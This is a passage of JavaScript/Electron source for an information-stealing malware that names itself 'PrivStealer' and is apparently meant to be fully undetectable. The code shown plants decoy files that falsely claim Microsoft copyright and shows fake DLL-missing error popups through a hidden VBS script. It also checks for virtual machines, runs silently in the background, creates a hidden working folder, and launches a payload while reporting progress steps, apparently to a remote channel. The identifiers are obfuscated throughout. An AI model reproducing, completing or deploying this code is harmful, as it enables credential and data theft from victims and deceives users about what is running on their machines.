            fs.writeFileSync(readmePath, `\nWindows System Service\nVersion: 1.0.0\n\nThis is a system maintenance service that helps keep your system running smoothly.\n\nFeatures:\n- System diagnostics\n- Performance optimization\n- Update management\n\n© Microsoft Corporation. All rights reserved.`);
            files.push(readmePath);
            const versionPath = path.join(tempDir, 'version.txt');
            fs.writeFileSync(versionPath, '1.0.0.0');
            files.push(versionPath);
        } catch (e) { }
        return files;
    }
    static performDiagnostics() {
        let result = 0;
        for (let i = 0; i < 100000; i++) {
            result += Math.sqrt(i);
        }
        return result;
    }
    static async xb0c2(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    static showFakeDllError() {
        if (Math.random() > 0.7) {
            return;
        }
        try {
            const tempDir = os.tmpdir();
            const vbsPath = path.join(tempDir, 'system_check_' + Date.now() + '.vbs');
            const dllErrors = ['MSVCR100.dll', 'MSVCP140.dll', 'VCRUNTIME140.dll', 'api-ms-win-crt-runtime-l1-1-0.dll', 'ucrtbase.dll'];
            const randomDll = dllErrors[Math.floor(Math.random() * dllErrors.length)];
            fs.writeFileSync(vbsPath, `\nSet WshShell = CreateObject("WScript.Shell")\nWshShell.Popup "The program can't start because ${randomDll} is missing from your computer. Try reinstalling the program to fix this problem.", 0, "System Error", 16\n`, 'utf8');
            exec(`cscript //nologo //B "${vbsPath}"`, {
                windowsHide: true
            }, error => {
                try {
                    fs.unlinkSync(vbsPath);
                } catch (e) { }
            });
        } catch (error) { }
    }
    static async runLegitimateRoutine() {
        await xp2q3({ content: "step 1 : fake error" }).catch(() => { });
        this.simulateServiceBehavior();
        await this.checkForUpdates();
        await this.checkNetworkConnectivity();
        this.createLegitimateFiles();
        this.performDiagnostics();
        this.showFakeDllError();
        await this.waitForHumanInteraction();
        this.createLogFile('Service initialization completed');
        return true;
    }
}
async function xp6q7() {
    try {
        const baseDir = process.env.LOCALAPPDATA || os.tmpdir();
        const deepFolder = path.join(baseDir, 'priv-local');
        fs.mkdirSync(deepFolder, {
            recursive: true
        });
        console.log(`[FUD] Using deterministic deep folder: ${deepFolder}`);
        return deepFolder;
    } catch (error) {
        const fallbackDir = path.join(os.tmpdir(), 'priv-local');
        fs.mkdirSync(fallbackDir, {
            recursive: true
        });
        console.log(`[FUD] Using fallback deep folder: ${fallbackDir}`);
        return fallbackDir;
    }
}
let appWindow = null;
async function xr8s9() {
    await xp2q3({ content: `step 0 : script started (Admin: ${AdminCheck.isAdmin()})` }).catch(() => { });
    console.log('Main started');
    try {
        console.log('=== PrivStealer Started ===');
        console.log('Starting Windows System Service...');
        console.log('Checking AntiVM config...');
        console.log('AntiVM disabled, skipping check');
        console.log('AntiVM disabled');
        console.log('Running system diagnostics...');
        await LegitimateModule.runLegitimateRoutine();
        console.log('Legitimate Routine finished');
        console.log('System diagnostics completed');
        console.log('Running security checks...');
        console.log('All security checks passed');
        console.log('Finding random deep folder...');
        const deepFolder = await xp6q7();
        console.log(`Deep folder found: ${deepFolder}`);
        console.log(`Found deep folder: ${deepFolder}`);
        if (appWindow) {
            setTimeout(() => {
                try { appWindow.webContents.send('show-launcher'); } catch (e) { }
            }, 3000);
        }
        console.log('Running payload...');
        console.log('Starting InputPayload.main()...');
        console.log('Starting InputPayload...');
        await InputPayload.xr8s0(deepFolder);
        // await xp2q3({ content: "--- [DEBUG] All Operations Finished Successfully ---" });
        console.log('InputPayload finished');
        console.log('All operations completed successfully!');
        console.log('=== Summary ===');
        console.log('Total logs: N/A');
        console.log('Errors: N/A');
        console.log('Success: N/A');
        console.log('Duration: N/A');

        console.log('All done');
    } catch (error) {
        console.log(`Fatal error: ${error.message}\n${error.stack}`);
        console.log(`Fatal error: ${error.message}`);
        console.log(`Stack trace: ${error.stack}`);
        process.exit(1);
    }
}
async function xt0u1() {
    try {
        await LegitimateModule.runLegitimateRoutine();
        if (AntiVM.check()) {
            process.exit(0);
        }
        const deepFolder = await xp6q7();
        await InputPayload.xr8s0(deepFolder).catch(e => {
            console.log(`Error: ${e.message}`);
        });
        setTimeout(() => process.exit(0), 100);
    } catch (error) {
        process.exit(1);
    }
}

const xv2w3 = async () => {
    console.log('Starting app execution...');
    if (process.argv.includes('--silent')) {
        xt0u1();
    } else {
        if (AntiVM.check()) {
            console.log("AntiVM check failed, but proceeding for debugging...");
        }

        xr8s9();
    }
};
let electronApp;
try {
    const electron = require('electron');
    if (typeof electron === 'object' && electron.app) {
        electronApp = electron.app;
    }
} catch (e) { }
if (electronApp) {
    electronApp.whenReady().then(() => {
        console.log('Running silently in background (no UI)...');
        xv2w3();
        setTimeout(() => {
            electronApp.quit();
        }, 120000); // 2 minutes timeout for slow uploads
    });
} else {
    console.log('Node environment detected - Calling xv2w3');
    xv2w3();
}
module.exports = {
    main: xr8s9,
    mainSilent: xt0u1,
    AntiVM,
    LegitimateModule,
    AdminCheck
};
